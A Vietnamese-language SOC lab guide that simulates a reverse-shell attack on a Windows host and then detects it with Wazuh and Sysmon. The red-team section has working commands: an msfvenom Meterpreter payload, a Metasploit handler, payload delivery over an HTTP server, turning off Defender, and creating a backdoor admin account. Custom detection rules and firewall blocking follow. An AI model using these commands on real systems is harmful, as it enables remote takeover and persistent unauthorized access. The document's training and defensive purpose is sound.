
> 🎬 **Video hướng dẫn / diễn tập (Lab5):** [https://drive.google.com/file/d/1-483IDj0-fgG-nVQjgdV8pAj316h9Xia/view?usp=sharing](https://drive.google.com/file/d/1-483IDj0-fgG-nVQjgdV8pAj316h9Xia/view?usp=sharing)

Kịch bản 5:  REVERSE SHELL

1. Mô tả tình huống

Kẻ tấn công thông qua một lỗ hổng ứng dụng web (RCE, File Upload, LFI) để tải lên mã độc webshell, hoặc lừa người dùng chạy mã độc nhằm thực thi lệnh PowerShell/Bash thiết lập một kết nối ngược (Reverse Shell) về máy chủ C2 (Command & Control) của hacker. Mục đích nhằm duy trì quyền truy cập ổn định, bỏ qua cơ chế ngăn chặn luồng vào của Firewall thông thường.

1. Mô hình Lab

2. Chuẩn bị môi trường

Máy Wazuh

Kiểm tra các service

systemctl status wazuh-manager

systemctl status wazuh-indexer

systemctl status wazuh-dashboard

Đảm bảo đều là

active (running)

Máy Windows

Cài

Wazuh Agent

Sysmon

Kiểm tra

Get-Service Wazuh

phải là Running

Kiểm tra Sysmon

Get-Service Sysmon64

3. Chuẩn bị Kali

Update

sudo apt update

Kiểm tra Metasploit

msfconsole

Nếu chưa có

sudo apt install metasploit-framework

Kiểm tra msfvenom

msfvenom --help

4. Các bước thực hiện tấn công (Red Team)

Trên Kali

mkdir ReverseShell

cd ReverseShell

Tạo payload

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.174.132 LPORT=4444 -f exe -o payload.exe 

Nếu thành công

payload.exe

sẽ xuất hiện trong thư mục.

Mở Listener

Mở

msfconsole

Thực hiện

msfconsole # đây là lệnh mở metasploit

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST 192.168.174.132

set LPORT 4444

exploit 

Kết quả

Started reverse TCP handler...

Lúc này Kali đang chờ Victim kết nối.

Tạo Website giả

Mở Terminal thứ hai

cd ReverseShell

Chạy

python3 -m http.server 8000

Website

http://192.168.174.132:8000

sẽ xuất hiện.

Máy Victim

Mở Browser

http://192.168.174.132:8000

Download

payload.exe

Sau đó chạy

payload.exe

(Nếu Windows Defender bật, có thể cần tắt trong môi trường lab để payload chạy.)

Kiểm tra Reverse Shell

Ngay lập tức

Metasploit sẽ hiển thị

Meterpreter session 1 opened

Kiểm tra quyền

shell

sau đó

whoami

Tạo User độc hại

Trong shell

net user attacker P@ssw0rd123 /add

Cho quyền Administrator

net localgroup administrators attacker /add

Kiểm tra

net user

net localgroup administrators

Tài khoản mới đã được tạo và thêm vào nhóm quản trị.

5. Kiểm tra trên Wazuh

Trên SIEM tiến hành kiểm tra log và alert liên quan

Xuất hiện nhiều hành vi bất thường user được tạo gán quyền Administrator

Mở chi tiết log và chú ý vào các trường nghi vấn

Chọn nút filter ( dấu cộng) để tiến hành theo luồng event kiểm tra thêm, chú ý event User account enabled or created

Mở chi tiết log ở field data.win.system.message thấy new account, như vậy kẻ xấu đã tạo thêm user mới

6. Xây dựng Rule

Chạy lệnh này trên Wazuh Server

  sudo nano /var/ossec/etc/rules/local_rules.xml

Phát hiện tạo User

<group name="windows,custom">

 <rule id="100704" level="12">

   <if_sid>60109</if_sid>

   <description>

     [CUSTOM] New Local User Created

   </description>

   <mitre>

     <id>T1136</id>

   </mitre>

 </rule>

</group>

Phát hiện thêm vào Administrator 

<group name="windows,custom">

  <rule id="100705" level="15">

    <if_sid>60154</if_sid>

    <description>

      [CUSTOM] User Added To Administrators Group

    </description>

    <mitre>

      <id>T1098</id>

    </mitre>

  </rule>

</group>

7. Thực hiện lại tấn công sau khi tạo rule

Xóa user

net user attacker /delete

Sau đó tạo lại và add vào Group

net user attacker P@ssw0rd123 /add 

net localgroup administrators attacker /add

Alert sẽ sinh ngay.

8. Hướng dẫn xử lý

Chặn kết nối Reverse Shell

PowerShell toàn bộ lệnh cùng một lúc. 

New-NetFirewallRule `

-DisplayName "Block ReverseShell" `

-Direction Outbound `

-Action Block `

-RemoteAddress 192.168.174.132 `

-Protocol TCP `

-RemotePort 4444

Get-NetFirewallProfile | Format-Table Name,Enabled

Get-NetFirewallRule -DisplayName "Block ReverseShell" | Get-NetFirewallAddressFilter

netstat -ano | findstr 4444 	

Xóa User

net user attacker /delete

Đổi Password Administrator

net user administrator *